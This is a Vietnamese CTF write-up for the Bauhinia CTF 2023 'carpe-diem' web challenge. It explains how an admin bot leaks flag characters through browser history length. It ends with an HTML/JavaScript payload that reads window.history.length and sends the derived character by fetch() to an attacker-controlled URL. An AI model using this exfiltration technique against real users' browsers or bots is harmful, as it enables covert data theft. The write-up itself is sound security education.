# analysis
```const idx = Math.floor(Math.random() * flag_content.length);
    const k = flag_content.charCodeAt(idx) - 65 + 1;

    for (let i = 0; i < k; i++) {
        await page.goto(`http://localhost:${PORT}/${crypto.randomBytes(20).toString("hex")}`, {waitUntil: "networkidle0"});
    }

    await page.goto(url+`?z=${idx}`, {waitUntil: "networkidle2"});
```
Quy trình thực hiện của code:  
- biến idx sẽ ra kết quả của Math.random() nhân với độ dài của flag và làm tròn xuống (hàm Math.random() sẽ trả về giá trị ngẫu nhiên từ 0<=x<1) nên giá trị của idx sẽ không thể lớn lơn độ dài flag và luôn lớn hơn 0
- biến k giá trị của nó sẽ là nội mã ascii của flag_content tại vị trí idx - 65 + 1 . ví dụ nếu vị trí idx là 'A' thì nó sẽ trả về 1  
![image](https://github.com/vanatka10/ctf_walkthrough/blob/533b78e7d934c5c4ef72136774b690e7d75bbf20/Bauhinia%20CTF%202023/web/carpe-diem_6f1189b7ee82fa28da29a6215ae9b0da/img/New%20Bitmap%20image.jpg)
- Thực hiện vòng lặp load 1 trang ngẫu nhiên 
- Cuối cùng là thực hiện đến trang web mà ta đã nhập vào ô input cùng với tham số z với giá trị là idx
# solution
- Nói đơn giản bài này chỉ là 1 biến idx cho biết vị trí ngẫu nhiên của k, còn biến k để hiển thị giá trị theo kiểu ascii cũng là ngẫu nhiên giá trị trong flag_content
- Ta có thể biết được hết giá trị idx cũng như độ dài của flag bằng cách kêu con bot ghé thăm nhiều lần . Vậy còn thiếu k là giá trị để biết nội dung của flag .
  ```
   for (let i = 0; i < k; i++) {
        await page.goto(`http://localhost:${PORT}/${crypto.randomBytes(20).toString("hex")}`, {waitUntil: "networkidle0"});
    }
  ```
  - Trong này nó thực hiện visit đến trang ngẫu nhiên , tưởng rằng vô dụng nhưng cách khai thác ở chỗ ta có thể đếm được k bằng cách dùng window.history.length bởi vì nó bot thực hiện visit trên cùng 1 tab nên sẽ để lại lịch sử từ đó ta sẽ có được k (trừ đi 3 nữa: trang đầu tiên trước khi bot visit,trang bot url mình gửi,và 1 trừ cái đầu tiên)
  payload:
```
<html>
  <body>
    <script>
      k=String.fromCharCode(window.history.length+62);
      fetch('${yoururl}/?char='+encodeURI(String(k)));
    </script>
  </body>
</html>
```



